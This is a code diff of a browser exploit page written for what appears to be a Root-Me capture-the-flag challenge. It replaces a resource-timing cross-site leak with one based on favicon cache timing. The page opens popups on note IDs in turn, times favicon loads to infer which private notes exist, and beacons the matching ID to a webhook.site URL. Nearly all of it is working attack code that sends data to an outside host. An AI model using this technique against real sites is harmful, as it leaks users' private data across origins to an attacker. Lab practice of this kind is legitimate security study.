@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>XS-Leak: Resource Detection</title>
+    <title>XS-Leak via Favicon Cache</title>
 </head>
 <body>
     <h1>Scanning notes...</h1>
@@ -10,12 +10,10 @@
         const TARGET_BASE = 'https://web-client-ch56.challenge01.root-me.org:58056/notes/';
         const WEBHOOK = 'https://webhook.site/04ff6bdb-7cda-4c12-b9a3-be41cf998864';
         const START_ID = 2805;
-        const END_ID = 3000;        // adjust if needed
-        const DELAY_MS = 500;
-        const IFRAME_TIMEOUT = 3000;
-
-        const CSS_URL = 'https://web-client-ch56.challenge01.root-me.org:58056/static/css/style.css';
-        const JS_URL  = 'https://web-client-ch56.challenge01.root-me.org:58056/static/js/main.js';
+        const END_ID = 3000;
+        const DELAY_MS = 800;
+        const POPUP_TIMEOUT = 1500;
+        const FAVICON_URL = 'https://web-client-ch56.challenge01.root-me.org:58056/static/images/rootme.png';
 
         function updateStatus(msg) {
             const div = document.getElementById('status');
@@ -23,65 +21,48 @@
             console.log(msg);
         }
 
-        async function checkResources(id) {
-            return new Promise((resolve) => {
-                const url = TARGET_BASE + id;
-                const iframe = document.createElement('iframe');
-                iframe.style.position = 'absolute';
-                iframe.style.top = '-9999px';
-                iframe.style.left = '-9999px';
-                iframe.style.width = '1px';
-                iframe.style.height = '1px';
-                iframe.src = url;
-
-                let resolved = false;
-                let foundCSS = false;
-                let foundJS = false;
-
-                // Monitor resource entries
-                const observer = new PerformanceObserver((list) => {
-                    for (const entry of list.getEntries()) {
-                        if (entry.name === CSS_URL) foundCSS = true;
-                        if (entry.name === JS_URL) foundJS = true;
-                    }
-                    if (foundCSS || foundJS) {
-                        if (!resolved) {
-                            resolved = true;
-                            observer.disconnect();
-                            clearTimeout(timeout);
-                            document.body.removeChild(iframe);
-                            resolve(true);
-                        }
-                    }
-                });
-                observer.observe({ entryTypes: ['resource'] });
-
-                const timeout = setTimeout(() => {
-                    if (!resolved) {
-                        resolved = true;
-                        observer.disconnect();
-                        document.body.removeChild(iframe);
-                        updateStatus(`ID ${id}: timeout (CSS=${foundCSS}, JS=${foundJS})`);
-                        resolve(foundCSS || foundJS);
-                    }
-                }, IFRAME_TIMEOUT);
-
-                // Start loading
-                document.body.appendChild(iframe);
+        async function measureFavicon(useCacheBuster = false) {
+            const start = performance.now();
+            await new Promise((resolve) => {
+                const img = new Image();
+                img.onload = () => resolve();
+                img.onerror = () => resolve();
+                let src = FAVICON_URL;
+                if (useCacheBuster) src += '?t=' + Date.now();
+                img.src = src;
             });
+            return performance.now() - start;
+        }
+
+        async function openPopupAndCache(id) {
+            const url = TARGET_BASE + id;
+            const popup = window.open(url, '_blank');
+            if (!popup) return false;
+            await new Promise(r => setTimeout(r, POPUP_TIMEOUT));
+            popup.close();
+            return true;
         }
 
         async function run() {
-            updateStatus(`Scanning IDs ${START_ID}–${END_ID}...`);
+            // Get baseline uncached time (with cache buster)
+            const uncached = await measureFavicon(true);
+            updateStatus(`Uncached favicon load: ${uncached.toFixed(2)} ms`);
+
             for (let id = START_ID; id <= END_ID; id++) {
-                performance.clearResourceTimings();
-                const found = await checkResources(id);
-                if (found) {
+                updateStatus(`Testing ID ${id}...`);
+                const opened = await openPopupAndCache(id);
+                if (!opened) {
+                    updateStatus(`  Popup blocked`);
+                    continue;
+                }
+                // Measure favicon load again (should be cached if page was valid)
+                const cached = await measureFavicon(false);
+                updateStatus(`  Favicon load after popup: ${cached.toFixed(2)} ms`);
+
+                if (cached < uncached * 0.7) {
                     updateStatus(`✅ Valid note at ID ${id}`);
                     new Image().src = `${WEBHOOK}?id=${id}`;
                     break; // remove break to continue scanning
-                } else {
-                    updateStatus(`ID ${id}: no resources detected`);
                 }
                 await new Promise(r => setTimeout(r, DELAY_MS));
             }
